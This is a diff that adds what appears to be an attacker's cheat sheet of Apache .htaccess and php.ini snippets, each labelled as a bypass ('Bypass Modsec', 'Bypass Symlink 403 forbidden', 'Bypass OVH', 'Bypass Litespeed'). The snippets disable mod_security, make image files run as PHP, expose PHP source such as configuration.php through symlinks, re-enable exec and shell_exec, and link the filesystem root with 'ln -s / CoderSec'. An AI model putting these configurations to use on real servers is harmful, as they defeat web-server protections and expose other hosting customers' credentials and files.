@@ -1,0 +1,109 @@
+<Directory "/home/user/public_html">
+Options -ExecCGI
+AllowOverride AuthConfig Indexes Limit FileInfo
+options=IncludesNOEXEC,Indexes,Includes,Multi
+Views ,SymLinksIfOwnerMatch,FollowSymLinks
+</Directory>
+- [ Ext Changer ]-
+AddHandler application/x-httpd-php .jpg .php
+- [ Run SSL ]-
+AddType text/html .shtml
+AddOutputFilter INCLUDES .shtml
+- [ Bypass Safe 400 ]-
+Options +Includes
+AddType text/html .shtml
+AddHandler server-parsed .shtml
+- [ Bypass Safe Mode ]-
+Options +FollowSymLinks
+DirectoryIndex ssssss.htm
+Options All Indexes
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+SecFilterCheckURLEncoding Off
+SecFilterCheckCookieFormat Off
+SecFilterCheckUnicodeEncoding Off
+SecFilterNormalizeCookies Off
+</IfModule>
+SetEnv PHPRC /home/user/public_html/php.ini
+suPHP_ConfigPath /home/user/public_html/php.ini
+- [ Bypass Symlink1 ]-
+Options All
+Options +FollowSymLinks +Indexes
+DirectoryIndex default.html
+AddType text/html php
+- [ Bypass Symlink2 ]-
+OPTIONS Indexes Includes ExecCGI FollowSymLinks
+AddHandler txt .php
+AddHandler cgi-script .cgi
+AddHandler cgi-script .pl
+OPTIONS Indexes Includes ExecCGI FollowSymLinks
+Options Indexes FollowSymLinks
+AddType txt .php
+AddType text/html .shtml
+Options All
+Options All
+- [ Bypass Symlink 500 ]-
+Options Indexes FollowSymLinks
+DirectoryIndex d3g1d5.htm
+AddType txt .php
+AddHandler txt .php
+- [ Bypass Modsec ]-
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+- [ Include symlink ]-
+Options Indexes FollowSymLinks
+DirectoryIndex ssssss.htm
+AddType txt .php
+AddHandler txt .php
+- [ Bypass Litespeed ] -
+wew.shtml
+do ==> ln -ls /home/user/public_html/
+configuration.php wew.shtml
+.htaccess
+Options +FollowSymLinks
+DirectoryIndex chesss.html
+RemoveHandler .php
+AddType application/octet-stream .php
+- [ Bypass OVH ]-
+.htaccess
+Options +FollowSymLinks
+DirectoryIndex Index.html
+Options +Indexes
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType root .root
+AddHandler cgi-script .root
+AddHandler cgi-script .root
+php.ini
+safe_mode = Off
+disable_functions =
+safe_mode_gid = Off
+open_basedir = Off
+register_globals = on
+exec = On
+shell_exec = On
+ln -s / CoderSec
+- [ Bypass Symlink 403 forbidden ] -
+.htaccess
+Options all
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None
+Satisfy Any
+Bypass symlink via .htaccess
+OPTIONS Indexes Includes ExecCGI FollowSymLinks
+AddHandler txt .php
+AddHandler cgi-script .cgi
+AddHandler cgi-script .pl
+OPTIONS Indexes Includes ExecCGI FollowSymLinks
+Options Indexes FollowSymLinks
+AddType txt .php
+AddType text/html .shtml
+Options All
+Options All
